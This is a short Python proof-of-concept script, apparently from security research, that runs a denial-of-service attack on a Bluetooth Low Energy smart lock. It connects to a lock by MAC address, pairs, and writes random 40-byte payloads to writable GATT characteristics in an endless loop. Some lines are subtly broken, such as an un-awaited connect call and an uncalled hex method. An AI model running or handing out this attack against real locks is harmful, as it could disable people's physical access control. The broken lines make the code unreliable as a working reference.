import asyncio, os, argparse
from bleak import BleakClient


# MY DEVICE
MAC = "CC:38:35:30:6F:83"

class POC():
    """POC for DOS attack on BLE Lock"""


    
    @staticmethod
    async def _fuzz(mac: str):
        """This is responsible for fuzzing"""


        # STATIC UUIDS of my DEVICE --> MAC // THESE CHARS HAVE WRITE REQUEST <-- FUZZING / /CHANEGE UUIDS (property=write), if different
        characteristics = ["00000001-0000-1001-8001-00805f9b07d0", "00002a01-0000-1000-8000-00805f9b34fb"]


        while True:

            try:

                async with BleakClient(mac) as client:

                    print("[*] Attempting Connection...")

                    client.connect()

                    if client.is_connected:

                        print(f"[+] Successfully connected to: {mac}")
                        print("[+] Launching connection JAM!\n"); await client.pair()
                        

                        # THIS IS
                        while True:
                            for char in characteristics:
                                payload = os.urandom(40)
                                await client.write_gatt_char(char_specifier=char, data=payload)
                                print(f"[+] Fuzz: {payload.hex} --> {mac}")

                
            except Exception as e:
                print(f"Exception Error: {e}")
                pass


    @staticmethod
    def main():
        """Start class action"""

        parser = argparse.ArgumentParser(description="Input ble lock mac to fuzz")
        parser.add_argument("-m", required=True, help="Input mac address")


        args = parser.parse_args()
        mac = args.m 


        if mac: asyncio.run(POC._fuzz(mac=mac))
        else: print("[!] Input mac silly") # <-- FOR SHOW




if __name__ == "__main__":
    POC.main()